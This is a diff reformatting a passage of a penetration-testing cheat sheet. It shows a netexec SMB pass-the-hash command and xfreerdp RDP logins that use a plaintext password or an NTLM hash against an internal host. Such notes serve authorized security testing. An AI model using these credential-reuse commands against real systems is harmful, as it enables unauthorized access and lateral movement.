@@ -112,8 +112,12 @@ netexec smb db01 -u administrator -H faf3185b0a608ce2f8afb6f8d133f85b --local-au
 ```
 
 ### RDP to host:
-- Password Auth: `xfreerdp /v:172.16.231.221 /u:amit /p:'Password123!' /cert-ignore /compression +dynamic-resolution +clipboard`
-- NTLM Auth: `xfreerdp /v:172.16.231.221 /u:amit /pth:'<NTLM HASH>' /cert-ignore /compression +dynamic-resolution +clipboard`
+
+Password Auth: 
+- `xfreerdp /v:172.16.231.221 /u:amit /p:'Password123!' /cert-ignore /compression +dynamic-resolution +clipboard`
+
+NTLM Auth: 
+- `xfreerdp /v:172.16.231.221 /u:amit /pth:'<NTLM HASH>' /cert-ignore /compression +dynamic-resolution +clipboard`
 
 ### atexec.py
 
